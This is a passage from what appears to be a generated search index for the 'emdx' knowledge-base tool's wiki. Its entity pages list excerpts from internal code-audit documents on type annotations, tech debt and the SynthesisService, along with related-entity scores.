\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=2.9)</li> <li><code>emdx/main.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=2.9)</li> <li><code>documents</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=2.7)</li> </ul>"},{"location":"entities/summary-statistics/","title":"summary statistics","text":"<p>Type: heading | Mentioned in: 13 documents | First seen: 2025-07-07</p>"},{"location":"entities/summary-statistics/#documents-13","title":"Documents (13)","text":"<ul> <li>#6510 None Type Analysis [7/7] </li> </ul>"},{"location":"entities/summary-statistics/#after","title":"After","text":"<p>self._selected_idx: int = -1 if self._selected_idx &gt;= 0:     ... ```</p>"},{"location":"entities/summary-statistics/#pattern-3-dataclass-field-factory","title":"Pattern 3: Dataclass Field Factory","text":"<pre><code># Before\nworktrees: list[GitWorktree] | None = None\n\ndef __post_init__(self) -&gt; None:\n    if self.worktrees is None:\n      ...\n\n- **#6507** None Type Analysis [7/7]\n  &gt; For each occurrence, I determine whether the None is **NECESSARY** (represents a real null state) or **UNNECESSARY** (can be removed or refactored). ---\n\n## Summary Statistics\n\n| File | Total `| None` | Necessary | Unnecessary | Notes |\n|------|-----...\n\n- **#6506** None Type Analysis [2/7]\n  &gt; `briefing()` command - since (lines 387-392)\n```python\nsince: str = typer.Option(None, \"--since\", \"-s\", ...),\n</code></pre> <p>Verdict: BUG \ud83d\udd34 - Type annotation says <code>str</code> but default is <code>None</code> - Should be <code>str | None</code></p>"},{"location":"entities/summary-statistics/#file-compactpy","title":"File: compact.py","text":""},{"location":"entities/summary-statistics/#1-compac","title":"1. `compac...","text":"<ul> <li>#6501 None Type Analysis [6/7] </li> </ul> <p>Analysis of <code>| None</code> type annotations in emdx/services/ files to determine if each is NECESSARY or UNNECESSARY. ## Summary Statistics</p> <p>| File | Total <code>| None</code> | Necessary | Unnecessary | |------|-----------...</p> <ul> <li>#6486 Any Type Removal Analysis [2/5] <p>async def load_execution_log(self, execution: Execution) -&gt; None: ... ```</p> </li> </ul>"},{"location":"entities/summary-statistics/#none-type-analysis-67-service-files","title":"None Type Analysis [6/7] \u2014 Service Files","text":""},{"location":"entities/summary-statistics/#summary-statistics_1","title":"Summary Statistics","text":"Category Count Total <code>Any</code> usages 32 Simple replacements (<code>object</code>) 12 Need Protocol definition 8 Fo... <ul> <li>#6437 Any/None typing audit [synthesis]   Section: Recommended Type Alias </li> <li>Total Any uses: 18</li> <li>Should remove: 2 (unused kwargs)</li> <li>Should replace: 9 (SQL params, return types)</li> <li> <p>Keep as-is: 7 (pre-cast dicts, intentional dynamics)</p> </li> <li> <p>#6418 Type System Audit: Replace Any/None with Concrete Types [3/4]</p> <p>Collection functions returning <code>dict[str, Any]</code> All the <code>_collect_*_data()</code> functions (lines 470-727) return <code>dict[str, Any]</code>. Each should have a corresponding TypedDict:</p> </li> <li><code>_collect_health_data() -&gt; HealthData</code></li> <li> <p>`_collect_duplicates_data() -&gt; Dupli...</p> </li> <li> <p>#6236 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]</p> <p>No integration test fixtures - Need real CLI runner fixtures</p> </li> <li>No mocking utilities - Common mocks for Claude, file system, database</li> </ul>"},{"location":"entities/summary-statistics/#summary-statistics_2","title":"Summary Statistics","text":""},{"location":"entities/summary-statistics/#recommended-conftestpy-additions","title":"Recommended conftest.py additions:","text":"<p>```python</p>"},{"location":"entities/summary-statistics/#pytest-asyncio-support","title":"pytest-asyncio support","text":"<p>@pytest.fixture def event_loop():...</p> <ul> <li>#6176 Delegate: Audit emdx/ui/ for dead TUI code. Check ALL ui/ files includ [5/17] </li> </ul> <p>Search found no references to: - swarm - mail (as a feature) - gist-list (as a command)</p>"},{"location":"entities/summary-statistics/#10-no-dead-swarmmailgist-list-references","title":"10. No Dead swarm/mail/gist-list References","text":""},{"location":"entities/summary-statistics/#summary-statistics_3","title":"Summary Statistics","text":"Finding Count wf_db parameter definitions 12 wf_db pass... <ul> <li>#5039 Parallel Fix Track Results - LSH Duplicate Detection <p>Use LSH to find candidate pairs with high Jaccard similarity</p> </li> <li>Verify candidates with MinHash similarity estimation</li> </ul>"},{"location":"entities/summary-statistics/#tests-run-and-results","title":"Tests Run and Results","text":"<p>All 23 tests passed in 0.93s</p> <p>Test categories: - TestTokenization: 6 tests \u2705 - TestMinHashCreation: 5 ...</p> <ul> <li> <p>#3073 Tech Debt Epic &amp; Task Breakdown</p> Task ID Title Files Effort Parallelizable QW-1 Fix bare except in zoom02_main.py emdx/ui/pulse/zoom02_main.py quick \u2705 QW-2 Fix redundant exception tuple in agent_form.p... </li> <li> <p>#186 EMAIL-MANAGEMENT-GUIDES   Section: Report Template</p> </li> <li>Total Emails Received: XXX</li> <li>Total Emails Sent: XXX</li> <li>Unread Emails: XXX</li> <li> <p>Response Rate: XX%</p> </li> <li> <p>#4547 Tech Debt Parallel Fix - Tech_Debt_Parallel_Fix Synthesis   Section: Synthesis Log</p> <p>...` method - still NotImplementedError (not yet removed or implemented)\\n\\n---\\n\\n## Summary Statistics\\n\\n| Track | Status | Key Metrics |\\n|-------|--------|------------|\\n| Track A | \u2713 50-60% | 4 files fully fixed, 2 partially fixed |\\n| Track B | \u2713 ~85% | 2...</p> </li> </ul>"},{"location":"entities/summary-statistics/#summary-statistics_4","title":"Summary Statistics","text":""},{"location":"entities/summary-statistics/#related-entities","title":"Related Entities","text":"<ul> <li><code>services</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>medium priority:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>low priority:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>show()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>high priority:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>emdx/ui/task_view.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>compose()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>9.</code>emdx/ui/task_view.py` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>self._search_service: any = none</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.0)</li> <li><code>emdx/commands/analyze.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.0)</li> </ul>"},{"location":"entities/summary-table/","title":"summary table","text":"<p>Type: heading | Mentioned in: 12 documents | First seen: 2026-02-13</p>"},{"location":"entities/summary-table/#documents-12","title":"Documents (12)","text":"<ul> <li> <p>#6678 Delegate Slimming Research [1/3]   Section: (C) COULD BE ELIMINATED ENTIRELY</p> <p>...thing. It's informational noise that doesn't change behavior. | | 25 | PR/branch summary tables (<code>_print_pr_summary</code>, <code>_print_branch_summary</code>) | 605\u2013636 | Nice-to-have stderr output. Not critical \u2014 the per-task metadata lines already report PR URLs and branc...</p> </li> <li> <p>#6677 Delegate Slimming Research [2/3]</p> <p>Create tasks for discovered work: <code>emdx task add \"Title\" -D \"Details\" --epic &lt;id&gt; --cat FEAT</code></p> </li> <li>Never end session without updating task status and creating tasks for remaining work</li> </ul> <p>Delegate sessions (auto-detected via <code>EMDX_AUTO_SAVE=1</code>...</p> <ul> <li>#6490 Any Type Removal Analysis [4/5] <p>Medium Priority (API Clarity)</p> </li> <li>All embedding service and client types (<code>_client</code>, <code>_embedding_service</code>, etc.)</li> <li> <p>File watcher observer and event types</p> </li> <li> <p>Low Priority (Nice to Have)</p> </li> <li> <p>TypedDict for <code>scored</code> and <code>get_popular_tags</code> re...</p> </li> <li> <p>#6484 Any Type Removal Analysis [4/5]</p> <p>Implementation Pattern (optional dependency): ```python from typing import TYPE_CHECKING</p> </li> </ul> <p>if TYPE_CHECKING:     from sentence_transformers import SentenceTransformer</p> <p>_model: SentenceTransformer | None = None</p> <p>def _get_model() -&gt; SentenceTransfor...</p> <ul> <li>#6417 Type System Audit: Replace Any/None with Concrete Types [4/4] <p>The codebase correctly uses <code>T | None</code> for nullable returns (e.g., <code>get_selected_result() -&gt; PaletteResultItem | None</code>). ---</p> </li> </ul>"},{"location":"entities/summary-table/#summary-table_1","title":"Summary Table","text":"<p>| Location | Current Type | Proposed Type | Priority | |----------|--------------|---------------|--------...</p> <ul> <li>#6407 PR Evaluation: #567, #569, #572, #573, #575 vs mypy PR #588 </li> </ul> <p>Date: 2026-02-15 Reference: mypy PR #588 touches 91 files</p>"},{"location":"entities/summary-table/#pr-evaluation-stale-vs-rebase-analysis","title":"PR Evaluation: Stale vs Rebase Analysis","text":""},{"location":"entities/summary-table/#summary-table_2","title":"Summary Table","text":"<p>| PR | Age | Title | Files | Overlap w/ #588 | Recommendation | |----|-----|-------|-------|-----------------|------------...</p> <ul> <li>#6384 Delegate: Think critically about the strategy recommendations in doc # [4/4] <p>The TUI should remain a bonus feature for occasional use, not a core differentiator. ---</p> </li> </ul>"},{"location":"entities/summary-table/#summary-table_3","title":"Summary Table","text":"Recommendation Verdict Confidence \"Agent Workspace\" identity Partially agree \u2014 keep KB c... <ul> <li>#6377 Codebase Bug Audit 2026-02-15 [5/10] </li> </ul>"},{"location":"entities/summary-table/#version-consistency-check","title":"Version Consistency Check","text":"<p>\u2705 PASS - Versions are synchronized: - <code>pyproject.toml</code>: <code>version = \"0.14.0\"</code> - <code>emdx/__init__.py</code>: <code>__version__ = \"0.14.0\"</code></p>"},{"location":"entities/summary-table/#import-chain-analysis","title":"Import Chain Analysis","text":"<p>\u2705 PASS - Entry points are clean: - <code>__main__.py</code> \u2192 ...</p> <ul> <li>#6326 Delegate: Analyze emdx/services/ for architecture improvements. Focus  [2/10] <p>Dependency injection for database connections (currently mixed patterns)</p> </li> <li>Event-driven architecture for execution monitoring (currently polling-based in cascade_service.py:100-149)</li> </ul>"},{"location":"entities/summary-table/#summary-table_4","title":"Summary Table","text":"<p>| Category | Files | Issues | Priority |...</p> <ul> <li>#6223 Delegate: Audit CONFIGURATION DEBT in the emdx project: Find hardcoded [2/14] <p>Consider config file support - Allow overriding constants via YAML/TOML</p> </li> <li>Add config validation CLI - <code>emdx config validate</code> command</li> </ul>"},{"location":"entities/summary-table/#summary-table_5","title":"Summary Table","text":"<p>| Category | Files Affected | Constants Needed | |----------|----------------|-----...</p> <ul> <li>#6216 Delegate: Audit MIGRATION/SCHEMA DEBT in the emdx project: Check datab [6/14] <p>Recommendation: Update CHECK constraint to only allow 'direct' and 'manual'. ---</p> </li> </ul>"},{"location":"entities/summary-table/#summary-table_6","title":"Summary Table","text":"# Finding Severity Migration Status 1 last_heartbeat column dropped HIGH 013 ... <ul> <li>#6155 Delegate: Audit the emdx CLI for dead/unused features that should be r [1/3] <p>Action: None needed. ---</p> </li> </ul>"},{"location":"entities/summary-table/#summary-table_7","title":"Summary Table","text":"Item Location LOC Confidence Action Document source functions documents.py:669-684 ~15 HIGH Delete Document service re-exports ..."},{"location":"entities/summary-table/#related-entities","title":"Related Entities","text":"<ul> <li><code>matches</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>circular dependency</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>_get_model</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>_get_embedding_service</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>_get_client</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>\"~/.claude/claude_cli.json\"</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>session-end.sh</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>_client</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>save-output.sh</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.1)</li> <li><code>executive summary found</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.1)</li> </ul>"},{"location":"entities/synthesisresult/","title":"synthesisresult","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-16</p>"},{"location":"entities/synthesisresult/#documents-8","title":"Documents (8)","text":"<ul> <li>#6508 Any Type Removal Analysis [synthesis]   Section: Common Patterns Identified <p>..., <code>PipelineActivityDict</code> (UI layer)</p> </li> <li><code>CompactDocumentRow</code>, <code>DistillDocumentRow</code>, <code>SynthesisResult</code> (Commands)</li> <li><code>PopularTag</code>, <code>FuzzyDocInfo</code> (Services)</li> <li> <p>Update kwargs: <code>TaskUpdateKwargs</code>, <code>ExecutionUpdateKwargs</code>, <code>GroupUpdateKwargs</code></p> </li> <li> <p>#6504 Any Type Removal Analysis [5/5]   Section: emdx/commands/compact.py</p> <p>Recommended Type: ```python class SynthesisResult(TypedDict):     content: str     title: str     input_tokens: int     output_tokens: int     source_ids: list[int]</p> </li> <li> <p>#6476 EMDX Knowledge Base Enhancement: Complete Implementation Guide   Section: Implementation Components</p> <p>..._fetch_documents()`</p> </li> <li>Import guards for optional <code>anthropic</code> dependency</li> <li> <p>Returns <code>SynthesisResult</code> with content, title, token usage</p> </li> <li> <p>#6467 emdx distill Command Implementation   Section: Core Components</p> <p>...ce.py`)</p> </li> <li>Main service class for AI-powered document synthesis using Claude API</li> <li><code>SynthesisResult</code> dataclass tracks synthesis output, source IDs, token usage, and model used</li> <li> <p><code>Audience</code> enum defines three modes: <code>ME</code> (personal notes), <code>DOCS</code> (documentation), `CO...</p> </li> <li> <p>#6451 Implement emdx distill command   Section: Summary</p> <p>...ith Claude Opus API integration for AI-powered document synthesis. Includes:</p> </li> <li><code>SynthesisResult</code> dataclass</li> <li>Audience-aware prompts (me/docs/coworkers)</li> <li> <p>Import guards for optional <code>anthropic</code> dependency</p> </li> <li> <p>#6450 Implement emdx distill command   Section: 1. emdx/services/synthesis_service.py</p> <p>Key Components:</p> </li> <li><code>SynthesisResult</code> dataclass - Result container with content, source IDs, token count, and model</li> <li><code>SynthesisService</code> class - Main service with:</li> <li> <p><code>synthesize_documents()</code> - Takes d...</p> </li> <li> <p>#6448 Implement emdx compact command   Section: Components Created</p> <p>...sized content</p> </li> <li>Uses <code>[ai]</code> extra (anthropic) with proper import guards</li> <li> <p>Returns <code>SynthesisResult</code> dataclass with content, title, token usage</p> </li> <li> <p>#6446 Implement emdx distill command   Section: Files Created/Modified</p> <p>...t synthesis</p> </li> <li><code>Audience</code> enum with three modes: <code>ME</code>, <code>DOCS</code>, <code>COWORKERS</code></li> <li><code>SynthesisResult</code> dataclass for tracking synthesis output and token usage</li> <li>Uses Claude Sonnet API via anthropic SDK (optional dependency)</li> <li>Audience-specific prompts for diffe...</li> </ul>"},{"location":"entities/synthesisresult/#related-entities","title":"Related Entities","text":"<ul> <li><code>taskupdatekwargs</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>print_json</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>mocked anthropic</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>implementation: emdx distill command</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>groupupdatekwargs</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>executionupdatekwargs</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>distilldocumentrow</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>coworkers</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>compactdocumentrow</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>compact command</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> </ul>"},{"location":"entities/synthesisservice/","title":"synthesisservice","text":"<p>Type: tech_term | Mentioned in: 12 documents | First seen: 2026-02-15</p>"},{"location":"entities/synthesisservice/#documents-12","title":"Documents (12)","text":"<ul> <li>#6745 Wiki Generation Architecture Research [2/10]   Section: Key Findings <p>...ippets without a checklist</p> </li> <li>Sonnet 4.6 = Opus quality at 60% cost \u2014 existing <code>SynthesisService</code> uses old Opus 4 ($15/$75), should update</li> <li>Two-phase (outline then write) catches errors early and enables human review before expensive generation</li> <li> <p>**Conflict...</p> </li> <li> <p>#6743 wiki-synthesis-research   Section: Integration with Existing emdx Infrastructure</p> <p>This pipeline builds on existing code:</p> </li> <li><code>SynthesisService</code> (<code>synthesis_service.py</code>) \u2014 already handles Claude CLI execution, prompt construction, and result parsing. Needs new prompt templates for wiki-style output.</li> <li> <p>**`c...</p> </li> <li> <p>#6719 Wiki Generation Quality Assessment &amp; Feedback Loops   Section: Context</p> <p>emdx generates wiki articles from document clusters via LLM synthesis (using <code>SynthesisService</code> and <code>DistillService</code>). This research covers quality assessment, feedback loops, and improvement mechanisms for auto-generated content.</p> </li> <li> <p>#6584 Delegate: Add missing all exports to emdx/services/cli_executor/__ [1/2]   Section: Symbols NOT Added (and why)</p> <p>...<code>UnifiedSearchService</code>, <code>SearchQuery</code>** \u2014 only lazy-imported inside functions</p> </li> <li><code>SynthesisService</code>, <code>DistillService</code> \u2014 only lazy-imported inside functions</li> <li><code>FileWatcher</code> \u2014 requires watchdog (optional dep)</li> <li> <p><code>AskService</code> \u2014 only lazy-imported inside func...</p> </li> <li> <p>#6565 Delegate: Look at the synthesis_service.py \u2014 how does --synthesize wor [3/3]   Section: NOT Using synthesis_service.py</p> <p><code>synthesis_service.py</code> contains:</p> </li> <li><code>DistillService</code> \u2014 Used by <code>emdx distill</code> for audience-aware synthesis</li> <li> <p><code>SynthesisService</code> \u2014 Used by <code>emdx compact</code> for merging related documents</p> </li> <li> <p>#6476 EMDX Knowledge Base Enhancement: Complete Implementation Guide   Section: Overview</p> <p>...2. <code>emdx delegate --draft</code> \u2014 Draft PR mode for review-first workflows  </p> </li> <li> <p><code>SynthesisService</code> \u2014 Shared service for document synthesis operations</p> </li> <li> <p>#6452 Implement emdx compact command   Section: Summary</p> <p>Successfully implemented the <code>emdx compact</code> command and its <code>SynthesisService</code> dependency per gameplan #6368.</p> </li> <li> <p>#6450 Implement emdx distill command   Section: 1. emdx/services/synthesis_service.py</p> <p>...` dataclass - Result container with content, source IDs, token count, and model</p> </li> <li><code>SynthesisService</code> class - Main service with:</li> <li><code>synthesize_documents()</code> - Takes documents and audience, returns synthesized content</li> <li> <p><code>_build_system_prompt()</code> - Audience-specific...</p> </li> <li> <p>#6449 Implement emdx compact command   Section: Implementation Complete</p> <p>I've successfully implemented the <code>emdx compact</code> command and its <code>SynthesisService</code> dependency:</p> </li> <li> <p>#6446 Implement emdx distill command   Section: Files Created/Modified</p> </li> <li>emdx/services/synthesis_service.py</li> <li><code>SynthesisService</code> class for AI-powered document synthesis</li> <li><code>Audience</code> enum with three modes: <code>ME</code>, <code>DOCS</code>, <code>COWORKERS</code></li> <li> <p><code>SynthesisResult</code> dataclass for tracking synthesis out...</p> </li> <li> <p>#6367 Gameplan: emdx compact \u2014 AI-Powered KB Synthesis   Section: Architecture</p> <p>...\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 document_merger \u2502  \u2502SynthesisService \u2502  \u2502 superseded tag  \u2502 \u2502 .py (extended)  \u2502  \u2502 .py (NEW)       \u2502  \u2502 + metadata      \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 ```</p> </li> <li> <p>#6447 Implement emdx distill command   Section: Summary</p> <ol> <li>SynthesisService (<code>emdx/services/synthesis_service.py</code>) \u2014 AI-powered document synthesis using Claude Sonnet API with audience-aware prompts</li> </ol> </li> </ul>"},{"location":"entities/synthesisservice/#new-files","title":"New Files","text":""},{"location":"entities/synthesisservice/#related-entities","title":"Related Entities","text":"<ul> <li><code>uses claude opus</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>synthesisservice</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>wikisynthesisservice</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>quality checks passed</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>important:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>implementation: emdx distill command</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>synthesis service</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>emdx compact</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.7)</li> <li><code>tests/test_compact.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> <li><code>superseded-by:id</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> </ul>"},{"location":"entities/synthesisservicepy/","title":"synthesis_service.py","text":"<p>Type: tech_term | Mentioned in: 11 documents | First seen: 2026-02-16</p>"},{"location":"entities/synthesisservicepy/#documents-11","title":"Documents (11)","text":"<ul> <li>#6873 Delegate: Document #6864 (Delegate synthesis [synthesis]):</li> </ul>"},{"location":"entities/synthesisservicepy/#synthes-14","title":"Synthes [1/4]","text":"<p>Section: Functions with ZERO Callers Outside Their Own File</p> <p>...tion_monitor.py<code>|</code>kill_zombie_processes<code>| **NO** | no | *nowhere* | |</code>services/synthesis_service.py<code>|</code>distill_single<code>| **NO** | no | *nowhere* | |</code>services/ask_service.py<code>|</code>ask_with_context<code>| **NO** | no | *nowhere* | |</code>services/cli_executor/factory.py<code>|</code>...</p> <ul> <li> <p>#6745 Wiki Generation Architecture Research [2/10]   Section: Integration Points</p> <p>Builds directly on existing <code>synthesis_service.py</code>, <code>compact.py</code> (cluster discovery), <code>wikify_service.py</code> (auto-linking), and <code>entity_service.py</code> (cross-references). The new <code>WikiSynthesisService</code> would extend the e...</p> </li> <li> <p>#6743 wiki-synthesis-research   Section: Current Pricing</p> <p>Important: Sonnet 4.6 now matches Opus-level quality on most benchmarks at 60% of the cost. The existing <code>synthesis_service.py</code> defaults to <code>claude-opus-4-20250514</code> ($15/$75!) \u2014 it should be updated to Opus 4.6 ($5/$25) or Sonnet 4.6 ($3/$15).</p> </li> <li> <p>#6717 Wiki Generation Architecture Research [4/10]   Section: 8. Integration with Existing Code</p> <p>...plore.py<code>\u2014</code>_extract_topic_labels()<code>| Generate article titles from clusters | |</code>synthesis_service.py<code>\u2014</code>DistillService<code>| Adapt for article synthesis (</code>audience=docs<code>) | |</code>core.py:257-280<code>\u2014 save flow | Add</code>detect_affected_articles()` after entity wikification |...</p> </li> <li> <p>#6584 Delegate: Add missing all exports to emdx/services/cli_executor/__ [1/2]   Section: <code>emdx/services/__init__.py</code> \u2014 9 Symbols Added</p> <p>....py<code>,</code>ui/activity/activity_view.py<code>| |</code>ExecutionResult<code>|</code>unified_executor<code>|</code>synthesis_service.py<code>,</code>tests/test_delegate_commands.py<code>,</code>tests/test_compact.py<code>| |</code>ExecutionConfig<code>|</code>unified_executor<code>|</code>synthesis_service.py<code>,</code>tests/test_unified_executor.py` |...</p> </li> <li> <p>#6583 Delegate synthesis [synthesis]   Section: Common Themes</p> <ol> <li>Known dict shapes masquerading as <code>dict[str, Any]</code> \u2014 <code>synthesis_service.py</code>, <code>claude_executor.py</code>, <code>estimate_cost()</code> all return dicts with fully known keys. TypedDicts should replace these.</li> </ol> </li> <li> <p>#6567 Delegate synthesis [synthesis]   Section: 2. Execution Modes</p> <p>Synthesis Mode: After parallel completion, concatenates all outputs (including failure summaries) and runs an additional synthesis task. This is implemented inline in <code>delegate.py</code>, NOT via <code>synthesis_service.py</code>.</p> </li> <li> <p>#6565 Delegate: Look at the synthesis_service.py \u2014 how does --synthesize wor [3/3]   Section: NOT Using synthesis_service.py</p> <p>Important: The <code>--synthesize</code> flag does NOT use <code>synthesis_service.py</code>. Instead, delegate.py implements its own synthesis logic inline.</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...ary</p> </li> <li>similarity.py: All 2 necessary</li> <li>ask_service.py: All 2 necessary</li> <li>synthesis_service.py: All 2 necessary</li> <li>document_merger.py: All 5 necessary</li> <li>embedding_service.py: All 1 necessary</li> <li>log_stream.py: All 1 necessary</li> <li> <p>health_monitor.py...</p> </li> <li> <p>#6497 None Type Analysis [6/7]   Section: ACTUALLY UNNECESSARY <code>| None</code> Annotations</p> </li> </ul> <pre><code>def 